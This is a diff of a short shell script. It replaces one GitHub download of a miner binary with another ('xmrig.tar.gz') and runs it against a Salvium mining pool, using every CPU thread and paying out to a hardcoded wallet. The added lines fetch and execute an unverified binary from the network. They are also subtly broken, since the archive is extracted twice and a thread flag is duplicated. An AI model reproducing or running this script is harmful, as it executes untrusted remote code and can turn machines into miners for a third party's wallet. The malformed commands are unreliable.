@@ -1,4 +1,5 @@
 #!/bin/sh
 apt-get update && apt-get upgrade
-wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
-./xlarig -o sg.salvium.herominers.com:1230 -u SaLvsCbtFAfR9X8meTAkrFYgqchndL2k7RZ1ryRR3maWAVzYDcJXu1ajWbuzUyodcG8teM5kHgGswYNrc77H8popZv9MqNZStve -p YOUR -a rx/0 -k -t $(nproc --all)
+wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz 
+tar -xvf xmrig.tar.gz && tar -xvf xmrig.tar.gz
+./xmrig --donate-level 1 -o de.salvium.herominers.com:1230 -u SaLvsCbtFAfR9X8meTAkrFYgqchndL2k7RZ1ryRR3maWAVzYDcJXu1ajWbuzUyodcG8teM5kHgGswYNrc77H8popZv9MqNZStve -a rx/0 -k -t -t $(nproc --all)
